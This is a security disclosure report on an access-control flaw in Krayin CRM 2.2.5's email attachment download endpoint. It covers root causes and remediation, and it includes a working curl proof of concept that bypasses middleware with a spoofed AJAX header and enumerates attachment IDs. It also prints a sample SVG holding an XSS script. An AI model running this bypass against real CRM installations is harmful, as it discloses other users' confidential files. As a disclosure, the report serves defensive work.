# Security Report — IDOR: Email Attachment Download (CWE-639 / CWE-862)

## Vulnerability Information

**Product:** Krayin CRM 2.2.5  
**Affected Versions:** Krayin CRM 2.2.4 and 2.2.5  
**Vulnerability Type:** Insecure Direct Object Reference (IDOR) / Broken Access Control  
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
**Additional CWE:** CWE-862 — Missing Authorization  
**Severity:** Medium  
**CVSS v3.1 Score:** 6.5  
**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N  

**Affected Component:** Email Attachment Download  
**Affected Endpoint:**

```
GET /admin/mail/attachment-download/{id}
```

**Authentication Required:** Yes  
**User Interaction Required:** No  
**Exploit Complexity:** Low  

**Attacker Profile:**  
Any authenticated user, including restricted custom roles with only dashboard permission.

**Status:** Confirmed by source code review and live Proof of Concept (PoC).

---

# 1. Executive Summary

Krayin CRM 2.2.5 contains an Insecure Direct Object Reference (IDOR) vulnerability in the email attachment download functionality.

The endpoint:

```
GET /admin/mail/attachment-download/{id}
```

allows authenticated users to download email attachments by supplying a numeric attachment identifier.

The application retrieves the attachment exclusively by its database ID and does not perform any authorization validation to confirm whether the current user has permission to access the requested attachment.

Although attachments are stored on a private local filesystem, the storage location does not provide protection because the controller directly exposes the file after retrieving the object.

A low-privileged dashboard-only account, without access to the mailbox containing the attachment, was able to download another user's private attachment by changing the attachment ID.

The vulnerability exists because of multiple authorization failures:

- Missing ACL permission mapping
- Middleware bypass through client-controlled AJAX header
- Missing object-level authorization in the controller

The issue remains exploitable in Krayin CRM 2.2.5 and presents the same behavior observed in version 2.2.4.

---

# 2. Vulnerability Description

The vulnerable endpoint:

```
/admin/mail/attachment-download/{id}
```

accepts an attacker-controlled numeric identifier.

The controller performs:

```php
$attachment = $this->attachmentRepository->findOrFail($id);

return Storage::disk(
    AttachmentRepository::resolveDisk($attachment->path)
)->download(
    $attachment->path,
    $attachment->name
);
```

The application trusts the supplied ID and directly returns the associated file.

No verification is performed to check:

- Whether the user owns the email
- Whether the user can view the mailbox
- Whether the user has permission to access the attachment
- Whether the attachment belongs to an authorized resource

Because attachment IDs are sequential, an attacker can enumerate identifiers and access files belonging to other users.

---

# 3. Root Cause Analysis

## 3.1 Missing ACL Authorization Mapping (CWE-862)

The route:

```
admin.mail.attachment_download
```

does not exist in the application's ACL permission configuration.

Because the permission is not registered:

- Bouncer authorization is never applied.
- Roles cannot restrict this functionality.
- Any authenticated user can reach the controller.

This creates a missing authorization control.

---

## 3.2 sanitize_url Middleware Bypass

The route is protected by the `sanitize_url` middleware.

However, the middleware contains the following logic:

```php
public function handle($request, Closure $next)
{
    if ($request->ajax()) {
        return $next($request);
    }

    // validation logic
}
```

The application trusts:

```
X-Requested-With: XMLHttpRequest
```

which is completely controlled by the client.

An attacker can bypass the middleware validation by sending:

```http
X-Requested-With: XMLHttpRequest
```

Example:

```bash
curl \
-H "X-Requested-With: XMLHttpRequest" \
http://target/admin/mail/attachment-download/1
```

The request is then processed without the intended validation.

---

## 3.3 Missing Object-Level Authorization (CWE-639)

The vulnerable method:

```
Mail\EmailController::download()
```

only performs:

```php
findOrFail($id)
```

followed by:

```php
Storage::download()
```

There is no:

- Ownership verification
- Email visibility check
- Permission validation
- Relationship validation

Unlike safer implementations such as:

```
ActivityController::download()
```

the email attachment download function does not call authorization methods.

---

# 4. Proof of Concept (PoC)

## 4.1 Environment Setup

Target attachment:

```
Attachment ID: 1
Filename: xss.svg
Size: 75 bytes
Storage:
storage/app/emails/1/eQ49...
```

The attachment belongs to an email unavailable to the low-privileged user.

---

# 4.2 Creating a Restricted Dashboard-Only User

Create role:

```bash
docker exec krayin-2.2.5 sh -lc \
"mysql -ukrayin -pkrayin krayin -e \
\"INSERT INTO roles 
(name,description,permission_type,permissions,created_at,updated_at)
VALUES
('idor862','poc','custom','[\\\"dashboard\\\"]',NOW(),NOW());\""
```

Retrieve role ID:

```bash
RID=$(docker exec krayin-2.2.5 sh -lc \
"mysql -ukrayin -pkrayin krayin -N -e \
\"SELECT id FROM roles WHERE name='idor862';\"")
```

Create user:

```bash
docker exec krayin-2.2.5 php \
/var/www/laravel-crm/artisan tinker \
--execute="
DB::table('users')->insert([
'name'=>'idor862',
'email'=>'idor862@test.local',
'password'=>bcrypt('test123'),
'status'=>1,
'role_id'=>$RID,
'created_at'=>now(),
'updated_at'=>now()
]);
"
```

---

# 4.3 Authentication

```bash
B="http://localhost:8085"
J="$(mktemp)"

curl -s \
-c "$J" \
-b "$J" \
"$B/admin/login" \
-o /tmp/login.html


TOKEN=$(grep -oE \
'name="_token" value="[^"]+"' \
/tmp/login.html \
| head -1 \
| sed -E 's/.*value="([^"]+)".*/\1/')


curl -s \
-c "$J" \
-b "$J" \
-d "_token=$TOKEN" \
--data-urlencode "email=idor862@test.local" \
--data-urlencode "password=test123" \
"$B/admin/login"
```

---

# 4.4 Control Test — Request Without AJAX Header

Request:

```bash
curl -s \
-b "$J" \
"$B/admin/mail/attachment-download/1"
```

Result:

```
Blocked by sanitize_url middleware
```

---

# 4.5 Exploitation — AJAX Header Bypass

Request:

```bash
curl -s \
-b "$J" \
-H "X-Requested-With: XMLHttpRequest" \
"$B/admin/mail/attachment-download/1" \
-o /tmp/idor.out \
-w "HTTP=%{http_code} SIZE=%{size_download} TYPE=%{content_type}\n"
```

Result:

```
HTTP=200
SIZE=75
TYPE=image/svg+xml
```

Downloaded content:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert("XSS")</script>
</svg>
```

The dashboard-only user successfully downloaded a private attachment.

---

# 4.6 Evidence Summary

| Test | Request | Result |
|---|---|---|
| Control | `/admin/mail/attachment-download/1` without AJAX header | Blocked |
| Exploit | `/admin/mail/attachment-download/1` with AJAX header | 200 OK - File Downloaded |

---

# 4.7 Attachment Enumeration

Because attachment IDs are sequential:

```
/admin/mail/attachment-download/1
/admin/mail/attachment-download/2
/admin/mail/attachment-download/3
...
```

an attacker can automate retrieval of all stored attachments.

---

# 4.8 Cleanup

```bash
docker exec krayin-2.2.5 sh -lc \
"mysql -ukrayin -pkrayin krayin -e \
\"DELETE FROM users WHERE email='idor862@test.local';
DELETE FROM roles WHERE name='idor862';\""
```

---

# 5. Impact Assessment

An authenticated attacker can access confidential files stored as email attachments.

Potentially exposed information:

- Customer documents
- Contracts
- Invoices
- Identity documents
- Internal communications
- Business files
- Private attachments

The vulnerability bypasses the application's intended mailbox visibility controls.

The normal interface correctly hides unauthorized emails, but the direct endpoint completely bypasses these restrictions.

---

# 6. Security Impact Scenario

Attack flow:

```
Authenticated User
        |
        |
        v
Modify attachment ID
        |
        |
        v
GET /admin/mail/attachment-download/{id}
        |
        |
        v
Missing Authorization Check
        |
        |
        v
Private Attachment Disclosure
```

---

# 7. Remediation Recommendations

## 7.1 Implement Object-Level Authorization

The controller must verify access before returning files.

Example:

```php
$attachment = $this->attachmentRepository->findOrFail($id);

$this->authorize(
    'view',
    $attachment->email
);

return Storage::download(
    $attachment->path,
    $attachment->name
);
```

---

## 7.2 Add ACL Permission

Register:

```
admin.mail.attachment_download
```

inside:

```
acl.php
```

Use a default-deny authorization model.

---

## 7.3 Remove AJAX Header Trust

The following header must never be considered a security mechanism:

```
X-Requested-With
```

The middleware should validate all requests regardless of:

- AJAX
- Browser type
- Client headers

---

## 7.4 Fix Incorrect HTTP Status Handling

Unauthorized requests should return:

```
401 Unauthorized
```

or:

```
403 Forbidden
```

The application currently masks some authorization failures by returning:

```
HTTP 200
```

with an error response body.

---

# 8. Vulnerability Classification Summary

| Field | Value |
|---|---|
| Vulnerability | IDOR |
| CWE | CWE-639 |
| Additional CWE | CWE-862 |
| Authentication | Required |
| Privileges Required | Low |
| User Interaction | None |
| Exploit Complexity | Low |
| Confidentiality Impact | High |
| Integrity Impact | None |
| Availability Impact | None |

---

# 9. Final Conclusion

Krayin CRM 2.2.5 contains an authorization bypass vulnerability affecting email attachment downloads.

Any authenticated user can retrieve private attachments by manipulating the numeric attachment identifier.

The vulnerability exists due to:

1. Missing ACL permission enforcement.
2. Client-controlled middleware bypass.
3. Missing object-level authorization.

The issue allows unauthorized disclosure of sensitive files and should be corrected by implementing proper authorization checks before allowing attachment downloads.
